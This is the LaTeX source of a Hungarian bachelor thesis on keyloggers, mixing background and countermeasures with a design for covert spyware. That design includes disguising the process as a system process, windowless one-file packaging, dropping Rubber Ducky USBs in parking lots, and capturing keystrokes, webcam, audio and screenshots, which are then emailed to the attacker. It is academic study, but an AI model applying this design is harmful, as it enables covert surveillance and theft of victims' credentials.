\documentclass[12pt,a4paper,oneside]{report}

\usepackage{ifxetex}
\ifxetex
  \usepackage{fontspec}
\else
  \usepackage[T1]{fontenc}
  \usepackage[utf8]{inputenc}
  \usepackage{lmodern}
\fi

\usepackage[magyar]{babel} % Alapértelmezés szerint utoljára definiált nyelv lesz aktív, de később külön beállítjuk az aktív nyelvet.

\usepackage{combelow}
\usepackage{newunicodechar}

\newunicodechar{Ș}{\cb{S}}
\newunicodechar{ș}{\cb{s}}
\newunicodechar{Ț}{\cb{T}}
\newunicodechar{ț}{\cb{t}}

\usepackage{cmap}
\usepackage{amsfonts,amsmath,amssymb} % Mathematical symbols.
\usepackage[ruled,boxed,resetcount,linesnumbered]{algorithm2e} % For pseudocodes.
\def\algorithmcfname{algoritmus}
\makeatletter
\renewcommand{\fnum@algocf}{\AlCapSty{\AlCapFnt\thealgocf.\nobreakspace\algorithmcfname}}
\makeatother

\usepackage{booktabs} % For publication quality tables for LaTeX
\usepackage{sidecap}

%\usepackage{fancyhdr}
%\usepackage{lastpage}

\usepackage{anysize}
\usepackage{sectsty}

% For hyperlinks in the generated document. 
\usepackage{color}

%\usepackage[amsmath,thmmarks]{ntheorem} % Theorem-like environments.

\usepackage[hang]{caption}
\usepackage{scrextend}

\usepackage{indentfirst}
\usepackage{pdfpages}

\usepackage{xfrac}
\usepackage{eurosym}

\usepackage{fullpage} % a margokra is lehessen irni

\newcommand{\vigyazat}{\marginpar{\textcolor{red}{\emph{Vigy\'azat!}}}}

\usepackage{tikz}
\usepackage{verbatim}
\usetikzlibrary{arrows,shapes}
\usetikzlibrary{positioning}
\tikzset{main node/.style={circle,fill=blue!20,draw,minimum size=1cm,inner sep=0pt},
}



%\usepackage[none]{hyphenat}
\usepackage{graphicx}
\usepackage{xcolor}
\usepackage{multicol}
\usepackage{float}
\usepackage{ragged2e}
\usepackage{setspace}
\usepackage{indentfirst}
\usepackage{adjustbox}
\usepackage[normalem]{ulem}
%\usepackage{algpseudocode}
\usepackage{listings}
%\usepackage[left=4cm, right=3cm, top=3cm]{geometry}
\usepackage[backend=biber]{biblatex}
\addbibresource{references.bib}


\newcommand{\szakHU}{INFORMATIKA SZAK} % SZOFTVERFEJLESZTES
\newcommand{\szakRO}{SPECIALIZAREA INFORMATIC\v A} % SPECIALIZAREA DEZVOLTAREA APLICA\c TIILOR SOFTWARE
\newcommand{\szakEN}{INFORMATION TECHNOLOGY SPECIALIZATION} %SOFTWARE DEVELOPMENT SPECIALIZATION


\newcommand{\dolgozattipusHU}{DIPLOMADOLGOZAT} % MESTERI DISSZERT\'ACI\'O
\newcommand{\dolgozattipusRO}{LUCRARE DE DIPLOM\v A} %TEZA DE MASTERAT
\newcommand{\dolgozattipusEN}{BACHELOR THESIS} % MASTER THESIS

\newcommand{\szerzo}{Felmeri Zsolt} % Szerző neve
\newcommand{\temavezetoA}{Dr. Szántó Zoltán}

\newcommand{\temavezetoAfokozat}{Adjunktus}% Egyetemi tan\'ar
\newcommand{\temavezetoAfokozatRo}{Șef lucrări}% Profesor universitar
\newcommand{\temavezetoAfokozatEn}{Lecturer} %Full Professor
\newcommand{\temavezetoB}{} % Második konzulens neve; hagyd üresen, ha egy konzulensed van.
\newcommand{\cimHu}{Keylogger} % Cím
\newcommand{\cimRO}{Keylogger}
\newcommand{\cimEN}{Keylogger}
\newcommand{\ev}{2021} %az aktualis ev

\input{thesis-hu}

\input{preamble.tex}

\begin{document} 
\include{titlepage}
\include{titlepage-ro}
\include{titlepage-en}

%\include{table}

\includepdf[pages={1}]{Declaratie.pdf}
\include{abstract}

% table of contents
\renewcommand{\contentsname}{Tartalomjegyzék}
\tableofcontents\vfill
\thispagestyle{empty}
\cleardoublepage

% content section (body)
\pagenumbering{arabic}

\hyphenchar\font=-1
\sloppy

\chapter{Bevezető}\label{sec:intro}
Világunk egyre inkább a digitalizálódás fele halad. Ennek következtében már a legtöbb embernek birtokában van legalább egy számítógép, ami lehet hordozható laptop vagy asztali gép. Mivel az emberek 2021-ben rendelkeznek digitális ujjlenyomattal, ezért az adatok bisztonsága előtérbe kerül. Egy ilyen eszköz, amely az adatokkal dolgozik, a keylogger. A keylogger egy olyan szoftver vagy hardver, amely a számítógéphez csatlakoztatott billentyűzet naplózására használandó. A dolgozatban a legnagyobb szerepben a szoftver alapú keylogger részesül. Ugyanakkor, a szoftver kivitelezésénél a támadó szemszöge kerül előtérbe, akinek az a célja, hogy adatokat feltünésmentesen tudjon eltulajdonítani.

A keyloggereknek van jó, illetve rossz oldaluk is. Rosszhírük a filmvilágnak köszönhetően terjedt el rohamosabban, ugyanis a filmekben az úgynevezett hacker használ ilyen és ehez hasonló eszközöket. A mindennapi életből vehetjük akár egy gyanakodó férj vagy feleség példáját. Akár a féltékenység szüleményeként létrejött keylogger segíthet annak a felderítésében, hogy a másik fél kivel kommunikál és akár az egész írásbeli beszélgetés nyomon követhető. A fennebb megadott példák, helyzetek a rossz használati utakról szólnak, viszont egy sokkal helyénvalóbb módja a használatának cégeken belül mutatkozik meg. A cégek esetében, ha hiba keletkezik ellenőrizni lehet, hogy mi is a kiváltó ok, azáltal, hogy nyomon tudják követni az alkalmazottaik számítógép használatát az irodában.

Az első keylogger hardver alapú volt, amit a Szovjet Únió fejlesztett ki a 1970-es évek közepén írógépeket célozva. Megmérte az IBM Selectric írógépek nyomtatófejének mozgását a regionális mágneses mezőre gyakorolt finom hatásokon keresztül, amelyeket a nyomtatófej forgása és mozgásai okoztak. Egy korai keyloggert Perry Kivolowitz írt, és 1983 november 17-én tette közzé az Usenet net.unix-wizards, net.sources. A felhasználói módú program a karakterlisták (kliensek) felkutatásával és kiírásával működött, ahogyan a Unix kernelbe beállították. Az 1970-es években a kémek keyloggereket telepítettek az amerikai nagykövetség és a moszkvai konzulátus épületébe, kihasználva a Selectric II és a Selectric III elektomos írógépek hibáit. A szovjet nagykövetségek elektromos írógépek helyett kézi írógépeket használtak bizalmas információkhoz, nyilván azért, mert nem sebezhetőek az ilyen támadásokkal szemben. 2013-tól az orosz különleges szolgálatok még mindig írógépeket használnak.

Kevin Mitnick, a világ legkeresettebb binztonsági szakértője a következőt állítja a social engineering-ről \cite{ghostwires}: Amikor social engineering-et használsz, egy szerepet kell eljátszanod. Mielőtt elkezdenéd a social engineering-et, információt kell gyűjts a célpontról, hogy elérd a kitűzött célod. (``When you use social engineering, or "pretexting", you become an actor playing a role. Before you start social engineering for some particular goal, you do your reconnaissance.'')

A social engineering tehnikák egyszerűen azért működnek, mert az emberek bíznak azokban, akik hitelesek, például egy vállalat alkalmazottja. A trükk az, hogy ha érzékeny információt kérsz, akkor az emberek azonnal gyanakodni kezdenek. De ha úgy teszel, mintha már rendelkeznél az információval, és valami rosszat adsz nekik, akkor gyakran kijavítanak. (``The social engineering techniques work simply because people are very trusting of anyone who establishes credibility, such as an authorized employee of the company. The trick is if you ask for a piece af sensitive information, people naurally grow immediately suspicious. If you pretend you already have the information and give them something that is wrong, they'll frequently correct you.'')

Az ellenintézkedések hatékonysága változó, mivel a keyloggerek különböző technikákat alkalmaznak az adatok rögzítésére. Így az ellenintészkedéseknek hatékonynak kell lenniük az adott adatrögzítési technikával szemben is. A grafikus felhasználói felülettel rendelkező operációs rendszereken használható a képernyőn megjelenő billentyűzet. Ez hatékony a hardveres keyloggerek ellen, ugyanis egyértelmű módon nem kerül sor a hagymányos billentyűzet használatára.

A következő fejezetben részletes bemutatásra kerülnek a keyloggerek tipusai és az ellenintézkedések formái.

\section{Célkitűzés}
\begin{itemize}
\item Tanulmányozni kell a pynput python modult, amely egy részben a billentyűzet eseményeit kezeli.
\item Tanulmányozni kell a zmq python modult, amely kommunikációs kapcsolatot alakít ki két vagy több gép között.
\item A támadó szemszögéből kell kivitelezni a dolgokat, például az alkalmazás ne tűnjön fel az áldozatnak, hogy fut a gépén.
\item Ki kell dolgozni a támadó (Hacker) részére és az áldozat (Target) részére egy-egy alkalmazást.
\item Leütött billentyűk elfogása.
\item Az áldozat felén a szoftver küldjön emailt a támadónak, ha a ZeroMQ protokoll kapcsolat megszakad.
\item A támadó felén a szoftver fogadja az emaileket.
\item Lehessen képernyőképet készíteni az áldozat számítógépén.
\item Lehessen web kamera képet készíteni az áldozatról.
\item Lehessen hangfelvételt készíteni.
\item Az elküldött csomagok titkosítása.
\item A titkosított csomagok tömörítése.
\item Futtatható fájl készítése.
\item Tesztelni az alkalmazást a három gyakori operációs rendszeren (Windows, Linux, MacOS)
\item Tesztelés virtuális gépeken.
\item Tesztelés valós gépeken.
\item Rubber Ducky skriptek megírása a gyakori operációs rendszerekre.
\item Eljuttatni az alkalmazást a felhasználó (Target) gépére és futtatni azt a háttérben.
\end{itemize}


\chapter{Bibliográfiai tanulmány}\label{sec:bibl}
A fejezet tartalmazza a keyloggerek és a rosszindulatú szoftverek definícióit, és hogy ezek milyen módszerrel kerülhetnek az áldozat rendszerére. Később, a keyloggerek elleni védelem kerül leírásra.

\section{Definíció}
A keyloggerek egyfajta szoftverek, amelyek rögzítik a billentyűzet billentyűleütéseit, és naplófájlba mentik azokat. Rosszindulatúsága abból fakad, hogy egy harmadik félnek eljuttatja a naplófájlba elmentett adatokat \parencite{ahmed2014survey}. Ennek következtében képesek érzékeny információk, például felhasználónév, PIN-kód és jelszó elfogására.  A rosszindulatú programoknak számos nevük van az angol nyelvben, például: ``malicious code (MC)'', ``malicious software'', ``malware'' és ``malcode''. Az alapvető megnevezés a ``malware'', ami a ``malicious'' és a ``software'' szavakból épül fel. 

Numerous, McGraw és Morrisett a következő képpen definiálták a rosszindulatú kódot \cite{ahmed2014survey}: ``bármely kód, amelyet hozzáadtak, megváltoztattak vagy eltávolítottak egy szoftverrendszerből annak érdekében, hogy szándékozan kárt okozzanak vagy felforgassák a rendszer tervezett funkcióját.''

Egy általános keylogger use-case diagramja \ref{fig:genkeylogger} ábrán látható. Ennek főbb mozzanatai: az áldozat gépének megfertőzése, az áldozat számítógéppel való interakciója, adatgyűjtés és az adatok megtekintése.

A szoftver eljuttatása az áldozat gépére különböző eszközök segítségével történhet, mint például e-mail, USB Rubber Ducky vagy hálózati szerver. E-mail-en keresztül csatolmányban lehetne elküldeni, de az e-mail szerverek blokkolják a futtatható fájlok küldését, mert tartalmazhat malcode-ot. Ezért egy letöltő linket szoktak küldeni, tehát a hálózati szerver az e-mail-lel együtt dolgozik.

A USB rubber ducky egy speciális USB, amit a számítógép billentyűzetként ismer fel. Léteznek úgynevezett ducky szkriptek, amelyeket bináris állományként a Windows NT rendszerek automatikusan lefuttatnak. A bináris állomány úgy hajtódik végre mintha billentyűzettel pötyögnénk be a szöveget csak sokkal gyorsabban kerül kivitelezésre.

A billentyűzet, a mouse használatát és az áldozat mindennapi tevékenységét a számítógéppel nevezzük a számítógéppel való interakciónak.

A köztes elem, amely összeköti a két felet az az Internet. A két fél a világ bármelyik felén lehet, mert a kapcsolat létesítését nem befolyásolja. A szoftver tartalmazhat több kapcsolatot is, de általában csak egyet szokott tartalmazni.

Az adatgyűjtés során az adatok egy, a szoftver által generált, naplóállományba mentődnek el. A több kapcsolatot kialakító szoftvernél figyelembe kell venni, hogy a különböző gépektől elküldött adat ne egymáson, hanem külön legyenek elmentve a kiértékelés szempontjából. Az adatgyűjtés lehet lokálist vagy globális. Lokálisról akkor beszélünk, ha csak egy alkalmazás használatakór kerül elmentésre az adat. A globális adatgyűjtés a rendszer teljes használatát átkarolja.

\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/general\ keylogger}
\caption{Általános keylogger}
\label{fig:genkeylogger}
\end{figure}

\section{Keylogger típusok}
Operációs rendszer szintjén két féle keylogger létezik: magas szintű és alacsony szintű (high-level and low-level) \cite{wood2010keyloggers}. A magas szintű keyloggerek az operációs rendszer felhasználói módjában hajtódnak végre, ezek a felhasználói mód horgainak variációival valósulnak meg. Windows operációs rendszeren a felhasználó billentyű-leütéses eseményeit egy olyan üzenetkezelő mechanizmus jelöli, amely a billentyűzet-ről átadja az adatokat annak az ablaknak, amely válaszol a billentyűleütésre. Ez az üzenetmechanizmus összekapcsolható, hogy a támadónak hozzáférést biztosítson a billentyűleütésekhez még azelőtt. hogy elérnék az alkalmazást.

A kontextustól függően a kifejlesztett keylogger globális vagy lokális horgot valósíthat meg a billentyűleütések eseményeinek lekérésére. A globális horgok az egész rendszerre kiterjedő üzeneteket, míg a lokális horgok az alkalmazás specifikus üzeneteket figyelik. Ezekkel az összekapcsolt üzenetekkel a támadó elolvashatja a beírt billentyűleütéseket, módosíthatja azok adatait, sőt teljesen megszakíthatja az üzenetáramlást. Azonban általában a keyloggerek csak a billentyűleütés adatait olvassák és továbbítják az üzenetet a lánc következő tagjának.

Az alacsony, kernel szintű keyloggerek általában ``rootware''-ként valósulnak meg \cite{butler2006r2}, ``rootkit'' és ``spyware'' kombinációjaként. A rootkit egy olyan program vagy eszközkészlet, amely titokban fut egy fertőzött gépen annak érdekében, hogy hosszú távú, észrevétlen hozzáférést biztosítson a rendszer gyökeréhez a támadó számára. Az elrejtettség általában kiemelt fontosságu a rootkit számára, mivel célja az operációs rendszer magjának (kernel) állandó módosítása. A spyware olyan szoftver, amely felhaszálói adatokat gyűjt az áldozat beleegyezése nélkül. Ezt a két kifejezést használva a rootware keyloggerek olyan rejtett szoftverek, amelyek bekapcsolódnak a létfontosságú rendszer szokásos munkameneteljébe, hogy összegyűjtsék és továbbítsák a felhasználói billentyűleütéseket az áldozat tudta és beleegyezése nélkül.

A keyloggerek négy fő kategóriára oszthatók: hardver, wireless, akusztikus és szoftver \cite{ahmed2014survey}. Bár ezeknek különböző a használati módjuk és az információ szerzési módszereik, egy közös dolgon osztoznak: lementik az ellopott információt vagy adatot egy log állományba.

\subsection{Wireless keylogger}
A wireless keylogger kihasználja a Bluetooth interfészeket, hogy a rögzített adatokat 100 méteres körzetben továbbítsa. Elsődleges célja az átvitt csomagok lehallgatása wireless billentyűzetről. Hátránya, hogy szükséges egy fogadó/antenna relatív közel a célpont munkakörnyékéhez.

\subsection{Hardver keylogger}
A hardver keylogger egy olyan fizikai eszköz, amely a billentyűzet és a számítógép között helyezkedik el. Kétféle csatlakozási módszer létezik: a keyloggerek közvetlenül összekapcsolhatók a billentyűzet és a számítógép között. A második módszer nem igényel fizikai kapcsolatot a számítógéppel, hanem egy keylogger áramkör telepítését igényli a billentyűzetbe. Ennek a módszernek az az előnye, hogy a felhasználók nem figyelhetik fizikailag a keyloggert.

\subsection{Szoftver keylogger}
A szoftver keylogger elfogja a billentyűzet és az operációs rendszer mentén haladó adatokat. Gyűjti a billentyű karaktereit egy állományba, majd továbbítja a támadónak, aki telepítette a keyloggert.

\subsection{Akusztikus keylogger}
A hardware keylogger-rel ellentétben az acoustic keylogger elemzésekor rögzíti az egyes billentyűleütések hangját. Különleges felszerelés szükséges a felhasználó gépelés hangjának meghallgatásához. Parabolikus mikrofonokat használnak nagy távolság alapuló rögzítésre, ezért ezt a mikrofont arra használják, hogy a billentyűzet hangját 30 méter távolságból vegye fel a célzott helyről.

\section{Keyloggerek elleni védelem}
Mivel létezik a rossz akarat, a kártevés akarata, ezért szükség van ezek kivédésére is. A rossz indulattal használt keyloggereket nagymértékben ellenőrizték és tettek ellenük, de napjainkban egyre több ilyen szoftver készül. Ezért lehetetlen az összeset megakadájozni. A rosszindulatú programok észlelését gyakran satikusan vagy dinamikusan nézik  \cite{wood2010keyloggers}. A statikus észlelés magába foglalja az aláírás alapú mintázatfelismerést, míg a dinamikus észlelés viselkedésbeli és működési alapú megfigyelést jelent. A statikus felismeréshez rosszindulatú programok észlelésére van szükség a rendszer figyelése érdekében, hogy a felismerhető rosszindulatú aláírásokat vagy `checksum'-okat kiszűrje. Ezek az aláírások lényegében oszlyan gépi utasítások szekvenciái, amelyek megfelelnek a program által a gazdagépen végrehajtott gyanús tevékenységnek. Két jelentős probléma merül fel ezzel a technikával:
\begin{itemize}
\item a rosszindulatú programfelismerőt folyamatosan frissíteni kell az új rosszindulatú programokkal
\item nincs védelem a rosszindulatú programok ellen, amelyek aláírása nem ismert
\end{itemize}
Az utóbbi a rosszindulatú keyloggerekre erősen vonatkozik, mivel nincs egyedi aláírásuk. Ezért dinamikus detektálási technikákat kell alkalmazni a rosszindulatú keyloggerek észlelésére.

\subsection{Aláírás alapú anti keylogger}
Az aláírás alapú anti keyloggerek olyan alkalmazások \cite{tuli2013system}, amelyek a telepített fájlok vagy DLL-ek, valamint az általa készített beállításjegyzék alapján azonosítják a keyloggereket. Bár sikeresen azonosítja az ismert keyloggereket, nem tudja azonosítani azokat a keyloggereket, amelyeknek aláírása nincs tárolva az adatbázisban.A virusirtó szoftverek többsége ezen a megközelítésen alapuló eljárást alkalmazzák.

\subsection{Horog alapú anti keylogger}
A Windows rendszereken egy horog folyamat a $SetWindowsHookEx$ függvényt használja, ugyanazokat a funkciókat, mint a horog alapú keyloggerek \cite{tuli2013system}. Ezt arra használják, hogy figyelemmel kísérjék a rendszer bizonyos típusú eseményeit, például billentyűleütés vagy egérkattintás. Azonban a horog alapú anti keyloggerek blokkolják a vezérlés ezen átadását egyik horog eljárásról a másikra. Ennek eredményeként a keylogger szoftver nem naplózza a billentyűket a billentyűleütés elfogásakor. Bár a horog alapú anti keyloggerek jobbak mint az aláírás alapú anti keyloggerek, de ezek továbbra sem képesek megállítani minden keyloggert.


\chapter{A rendszer specifikációi és architektúrája}\label{sec:specs_and_arch}

\section{Felhasználói követelmények}
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/specific\ keylogger}
\caption{A keylogger rendszer usecase diagramja}
\label{fig:specifickeylogger}
\end{figure}
A keylogger, a fejlesztett alkalmazás, feltételezve van, hogy valamilyen módon az áldozathoz kerül, aki használja. Miután az alkalmazás begyűjti az adatot, azt elküldi a támadónak. Ennek értelmében rendszernek két típusú felhasználója van: egy aktív és egy passzív. \ref{fig:specifickeylogger} ábra mutatja az általunk fejlesztett keylogger usecase diagramját.

A passzív felhasználó az ábrán levő áldozatot (Target) jelképezi. A szoftver az áldozat tudta nélkül kell fusson az operációs rendszeren, miközben az áldozat folyamatosan használja a számítógépét. Használat alatt karakterek bevitelét értjük a billentyűzeten keresztül. Az egér mozgása nem kerül monitorizálásra.

A támadó (Hacker) tölti be az aktív felhasználó szerepkörét. Legelső lépése a szoftver eljutatása az áldozat gépére. Az eljuttatáshoz használható a USB Rubber Ducky, amiből többet is lehet készíteni és elszórni például egy autó parkolóban, mert egy kíváncsi természetű ember mindig akad. A USB eszközök elszórása után a Hacker feladata, hogy elindítsa a szoftver rá eső részét, hogy a kapcsolat létre tudjon jönni.

A kapcsolat létrejötte után, a támadónak lehetősége van megtekinteni az áldozat rendszerének az információit, mint például a számítógép neve, processzor információ, bejelentkezett felhasználó felhasználóneve, a használatban levő operációs rendszer neve, verziószáma és arhitektúrája. Ha az áldozat használta a billentyűzetet, akkor a támadó megtekintheti az áldozat által lenyomott billentyűket karakterek vagy szavak formátumában.

A támadónak lehetősége van további adatszerzésre: képernyőkép (screenshot), webkamerakép (webcam picture) és hangfelvétel (audio recording) formátumban.

Ha a támadó úgy látja jónak, lehetősége adódik a kapcsolat felbontására. A kapcsolat felbontása után a billentyűzet eseményei az áldozat rendszerére mentődnek el egy állományba, és e-mail küldésével (állítható időközönként, például óra) továbbítja ezt az állományt a támadónak egy képernyőképpel együtt.

Az e-mail küldési folyamat csak addig működik, amíg az áldozat észre nem veszi, hogy egy általa nem kívánt szoftver fut a gépén, jelen esetben a keylogger, és azt szándékában áll leállítani. Ekkor leáll az adatgyűjtés és az adatok tövábbítása is.

\section{Rendszer követelmények}
\subsection{Funkcionális követelmények} %milyen inputra milyen output
A Hacker szemszögéből három alkalmazást különíthetünk el: Target app, Hacker app és GUI. \ref{fig:startupdia} ábra szemlélteti a rendszer működési folyamatát.

A Target app gépi kódra való lefordítása során figyelembe kell venni, hogy ez az alkalmazás a háttérben, feltűnés mentesen kell fusson. A futtatható fájlnak be lehet állítani az ikonját és a nevét is. Mivel minden futó program látható a folyamatok között az operációs rendszeren, ezért ha van egy ideális ikonja, és ha a neve megegyezik egy, az operácós rendszer által futtatott folyamat nevével, akkor kevésbé lesz feltűnő a Target számára, főleg ha ez el van rejtve valahol a folyamatok között. A taskmanagerben esetleg látható, de a felhasználók zöme nem követi ezt.

A támadó gépén levő alkalmazás és az áldozat gépén levő alkalmazás kapcsolódása után, a támadónak igénye lehet használni a GUI-t és a parancssoron megjelenő menüt. Amint a kapcsolat létrejött a támadó és az áldozat felek között, a GUI automatikusan elindul, és valós időben adódnak hozzá az adatok.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/startup\ diagram}
\caption{Működési folyamat}
\label{fig:startupdia}
\end{figure}

A GUI segít a megszerzett adatok megjelenítésében, amelyek a Hacker számítógépén el lesznek mentve külön állományokba. Itt három opció lehetséges: rendszerinformáció (PC Information) megtekintése, karakterek (Characters), illetve a karakterekből alkotott szavak (Words) megtekintése. Az alábbi opciókat gombnyomásra előhívhatja a felhasználó.

A rendszerinformáció megtekintésében a felhasználónak szükséges rákattintania a $PC Information$ gombra. Ez által egy új ablak ugrik fel, ahol az adatok megjelenítésre kerülnek. Az adatok az elmentett fájlból kiolvasva kerülnek az ablak megjelenítő részébe. Ez az ablak bármikor előhívható vagy bezárható, amíg a GUI alkalmazás fut.

A karaktereket egy másik elmentett állományból olvassa ki, és jeleníti meg egy legördülő listában, ha létezik ez az állomány, különben egy üres lista jelenik meg. A szavakat is meg lehet nézni, amelyek úgy épülnek fel, hogy a karakterek egy karakterláncba fűződnek amíg egy $ENTER$ (két ascii kód határozza meg CR/LF 10 + 13) vagy egy $SPACE$ (ascii kódja 13) elválasztó karakter nem következik. Például legyen egy karakterlánc: `p' `i' `r' `o' `s' `32' `a' `l' `m' `a' `13', a 32 jelenti a szóköz karakter ascii kódját és addig osszeállítja a ``piros'' szót. A 13 jelenti az újsor karakter ascii kódját, és addig felépíti az ``alma'' szót.

A táblázat \ref{tab:karlanc} egy példát szemléltet a szavak felépítésére. Az első sor tartalmazza a bemenetet, és a fent leírtak alapján a második két sor (piros és alma) jelenti a kimenetet.
\begin{table}[H]
\caption{Példa szóépítésre}
\label{tab:karlanc}
\hspace{7em}
\begin{tabular}{|c|c|c|c|c|c|c|c|c|c|c|}
\hline
p&i&r&o&s&32&a&l&m&a&10\\
\hline
\end{tabular}
\vspace{5pt}

\hspace{7em}
\begin{tabular}{|c|c|c|c|c|}
\hline
p&i&r&o&s\\
\hline
\end{tabular}
\vspace{5pt}

\hspace{7em}
\begin{tabular}{|c|c|c|c|}
\hline
a&l&m&a\\
\hline
\end{tabular}
\end{table}
Megjelenítésüket a karaktereknek és a szavaknak lehet váltogatni tetszés szerint a $Characters$ és a $Words$ gombokat alkalmazva.

Mivel a GUI egy egyedül álló alkalmazás, ezért be lehet zárni, és nem befolyásolja az adatgyűjtést.

A parancssoron (console vagy terminal) megjelenő menü arra szolgál, hogy a Hacker alkalmazás kérést küldjön a Target alakalmazás fele. A kérések a következők lehetnek: képernyőkép (screenshot), webkamerakép (webcam picture), hangfelvétel (audio recording) és kapcsolat bezárás. A kérés közben megjelenik, a folyamat ütemezési információja. Például, ha egy képernyőképet kér a Hacker, akkor megjelenik a folyamat kezdéséhez járuló szöveg, és a befejezésénél a végéhez járuló szöveg, hogy követhető legyen az adatátvitel, lásd ábra \ref{fig:logging}. A menüpontokat számok formátumban kell megadni a parancssoron:
\begin{itemize}
\item 1 = screenshot
\item 2 = webcam picture
\item 3 = audio recording
\item 4 = connection closure
\end{itemize}
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/tempsnip}
\caption{Kommunikáció követése a parancssoron}
\label{fig:logging}
\end{figure}

A képernyőkép készítése során, a kép minősége az áldozat képernyőjének a felbontásához igazódik. Például, ha a képernyő felbontása 1920x1080, akkor a pixelek száma a képen 2073600 lesz.

A webkamerakép előállításához az áldozatnak kell legyen webkamerája csatlakoztatva a számítógépéhez. A webkamerák többsége ledekkel ellátott, tehát ha a kamera működési fázisban van, akkor kigyúlnak a ledek rajta. Ezért a webkamerakép készítése kockázatos, mert az áldozatban gyanakvást kelthet.

A hangfelvétel készítéséhez az áldozatnak szüksége van egy működőképes mikrofonra. A hangfelvétel minősége 44100Hz. A felvétel időtartamát, másodpercbe mérve, meg lehet változtatni tetszés szerint, de ezt az áldozathoz való juttatás előtt kell megtenni. Alapértelmezetten tíz másodperces felvétel készül.

Az adatok begyűjtésére szükséges az Internet. A hálózatot használó kommunikáció a későbbiekben részletezve lesz.

\subsection{Nem funkcionális követelmények}
A szoftvert Windows, Linux és Darwin rendszerekre tervezzük. A rendszeren szükséges telepíteni a python 3.x verzióját, mivel olyan modulok és szintakszisok vannak használatban, amelyeket a python 2.x nem ismer. Például a formázott karakterláncot rövidebben lehet kivitelezni úgy, hogy a karakterlánc elejére egy f betű kerül és kapcsos zárójelekbe kerülnek a változónevek. A python 2.x verziójával ezt külön fuggvénnyel lehetett megvalósítani.

Ez egy olyan szoftver, amelyet törvényes és törvénytelen dolgokra is lehet használni. Törvényesen például monitorizálni a céges alkalmazottak munka időszakában lebonyolított tevékenységeket. Törvénytelen például, ha valaki arra használja, hogy ellopjon bizalmas információkat személyektől. Ez a használón múlik, hogy melyik utat választja.

\begin{multicols}{2}
\begin{itemize}
\item pynput = 1.6.8
\item pyautogui
\item pyaudio
\item wave
\item urllib
\item zmq = 21.0.1
\item base64
\item pickle
\item opencv
\item getpass
\item os
\item sys
\item threading
\item datetime
\item smtplib
\item email
\item imaplib
\item shutil
\item platform
\item tkinter
\item logging
\item pyinstaller = 4.1
\item http.server
\end{itemize}
\end{multicols}
A \emph{pynput} modul a billentyűzet és az egér eseménykezelését teszi lehetővé. Egy régebbi verzióját kell használni (1.6.8), mert a legújabb (1.7.2) nem kompatibilis a fordító programokkal.

A \emph{pyautogui} modullal képernyőképet lehet készíteni, és azt elmenti egy fájlba a rendszeren. A végrehajtásához szükséges, hogy a felhasznéló képernyőképet tudjon készíteni önmagénak.

A \emph{pyaudio} és a \emph{wave} modulok a hangfelvétel készítésében használandók. A \emph{pyaudio} egy listát állít elő a hanganyaggal, ahogyan azt ábrázolni lehet binárisan, míg a \emph{wave} ebből a lisából egy $.wav$ kiterjesztésű állományt készít. Ehez szükséges, hogy a felhasználónak legyen mikrofonja, ami csatlakoztatva van a számítógéphez.

Magasabb szinten használt kommunikációra a ZeroMQ protokollt használtuk, pythonban ez a \emph{zmq} modul használatát jelenti. Itt két kapcsolat szükséges: egy publisher (PUB) | subscriber (SUB) és egy request (REQ) | reply (REP).

A \emph{urllib} modul segítségével kéréseket küldhetünk a hálózaton.

A \emph{base64} modul használatával szövegtitkosítást lehet végezni, mivel a base64 szövegtitkosító agoritmust tartalmazza.

A \emph{pickle} modul bájtokká tömöríti az adatot így gyorsabb lesz az elküldése a hálozaton.

Az \emph{opencv} modul képek vagy videók feldolgozásában használható, például webkamerakép készítésére.

A \emph{getpass}, \emph{os}, \emph{sys}, \emph{shutil} és \emph{platform} modulok a rendszerfüggvények elérését biztosítja. A rendszerinformációit függvények használata, mint például a processzor specifikációi, a bejelentkezett felhasználo felhasználóneve, a számítógép neve, a rendszer verziószáma stb.

A \emph{threading} modul segítségével új, párhuzamos szálakat hoszhatunk létre. Ez segít több feladat elvégzésében egymást nem blokkolva.

A \emph{datetime} modullal le lehet kérni az aktuális időt, olyan formátumban amilyenben a használó szeretné.

Az \emph{smtplib}, \emph{imaplib} és \emph{email} modulok segítsígével lehet kapcsolódni a gmail szolgáltatóhoz üzenet küldés vagy fogadás céljából. Az \emph{imaplib} modullal lehet kapcsolatot teremteni olvasásra, míg az \emph{smtplib} modullal írásra, azaz küldésre. Az \emph{email} modul tartalmazza azokat az osztályokat, amelyek szükségesek egy email objektum létrehozásában és kódolásában.

A \emph{tkinter} modul a GUI elkészítésére használandó, ez felel a megjelenítésben.

A \emph{logging} modul segítségével visszajelzéseket adunk a szoftvertől a felhasználónak, hogy lehessen követni az aktuális feladat menetét. Ehez szükséges egy $logging.conf$ állomány, maely béállítja a loggolási opciókat.

A \emph{pyinstaller} modul egy fordító program, amely python kódból futtatható fájlt készít. Lefordításra csak a kliens kerül, mert azt kell az áldozat rendszerére telepíteni, úgy, hogy a háttérben fusson. Ezt be lehet állítani a $w$ opcióval Windows rendszereken, míg *NIX rendszereken nem veszi számításba ezt az opciót. A $onefile$ opció összesűríti egy futtathatóvá, ez által lehetővé teszi, hogy ne kelljen más szükséges állományokat is telepíteni az áldozat rendszerére. Be lehet állítani a futtatható fájl nevét ($name$ opció) és ikonját is ($icon$ opció). A modul 4.1 verzióját vagy ennél nagyobbat érdemes használni, mert a 4.1 verziótól támogatja a python 3.8 és 3.9 verziókat.

%Teljesítmény...

%Karbantarthatóság...

\chapter{A részletes tervezés}\label{sec:plan}
A szoftvert két nagy részre lehet osztani: Hacker oldal és Target oldal. A Hacker oldalhoz tartozik a GUI is. A két komponens mellett megtalálható egy kissebb rész (Utils), amely hasznos függvények implementációit tartalmazza úgy a Hacker, mint a Target oldalnak.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/component\ diagram}
\caption{Komponens diagram}
\label{fig:compdia}
\end{figure}

\section{Hacker oldal}\label{subsec:server}
